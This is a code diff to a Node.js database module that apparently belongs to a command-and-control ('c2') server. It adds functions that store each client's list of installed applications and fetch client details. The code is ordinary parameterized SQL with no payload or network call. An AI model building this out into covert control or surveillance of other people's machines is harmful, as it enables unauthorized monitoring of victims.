@@ -4,9 +4,11 @@ const mysql  = require("promise-mysql");
 const config = require("../config/db/c2.json");
 const fs = require('fs').promises;
 const path = require('path');
-const { v4: uuidv4 } = require('uuid');
 const c2 = require('./c2');
-const { cwd } = require("process");
+
+
+const multer = require("multer");
+
 let db;
 
 
@@ -22,7 +24,8 @@ module.exports = {
     addToPendingList: addToPendingList,
     displayPendingList: displayPendingList,
     removeFromPendingList: removeFromPendingList,
-
+    saveInstalledApps: saveInstalledApps,
+    getClientDetails: getClientDetails
     
 };
 
@@ -206,4 +209,30 @@ async function removeFromPendingList(clientid) {
   res = await db.query(sql, [clientid]);
   c2.logToFile(`Removed a client from pending list: ${(await c2.getClientInfo()).clientid}`, "admin")
   return res[0];
+}
+
+async function saveInstalledApps(clientid, installedApps) {
+  await db.query('DELETE FROM apps WHERE clientid = ?', [clientid]);
+
+  for (const app of installedApps) {
+    await db.query(`
+      INSERT INTO apps (clientid, name)
+      VALUES (?, ?)
+    `, [clientid, path.basename(app)]);
+  }
+  
+  c2.logToFile(`Saved ${installedApps.length} installed apps from client ${clientid}`, `${clientid}` )
+}
+
+async function getClientDetails(clientId) {
+  try {
+      const query = `SELECT * FROM admin_view WHERE clientid = ?`;
+      const rows = await db.query(query, [clientId]);
+      console.log('Client details:', rows[0]);
+      return rows[0];
+      
+  } catch (err) {
+      console.error('Error fetching client details:', err);
+      throw err;
+  }
 }
